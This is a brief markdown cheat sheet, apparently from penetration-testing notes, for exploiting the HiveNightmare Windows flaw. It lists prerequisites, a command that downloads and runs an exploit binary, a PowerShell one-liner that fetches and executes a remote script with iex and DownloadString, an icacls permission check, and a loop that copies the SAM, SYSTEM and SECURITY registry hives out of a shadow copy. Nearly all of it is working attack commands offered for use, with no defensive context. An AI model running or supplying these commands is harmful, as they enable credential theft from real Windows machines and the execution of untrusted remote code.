### Requirements
```
- system protection must be in enabled state
- system must have at least one shadow copy
```

### Exploit
```
iwr https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe -OutFile HiveNightmare.exe
.\HiveNightmare.exe
```

### Alternative
```
iex((New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/WiredPulse/Invoke-HiveNightmare/main/Invoke-HiveNightmare.ps1'))
```

### Manually - check for read permissions
```
icacls C:\Windows\system32\config\sam
```

### Copy shadow copy (sometimes HarddiskVolumeShadowCopy2 or HarddiskVolumeShadowCopy3)
```
foreach($i in @("SYSTEM","SECURITY","SAM")){[System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\$i", "C:\temp\$i")};
```

### References
* https://github.com/GossiTheDog/HiveNightmare  
* https://github.com/WiredPulse/Invoke-HiveNightmare  

